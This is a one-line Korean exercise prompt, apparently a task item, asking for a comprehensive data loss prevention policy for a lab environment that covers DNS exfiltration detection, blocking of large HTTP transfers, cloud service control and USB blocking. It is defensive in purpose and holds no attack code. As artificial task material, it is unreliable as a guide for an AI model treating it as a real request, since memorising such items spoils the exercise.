실습 환경에 대한 종합 DLP 정책을 설계하라. DNS 유출 탐지, HTTP 대용량 전송 차단, 클라우드 서비스 제어, 엔드포인트 USB 차단 등을 포함할 것.
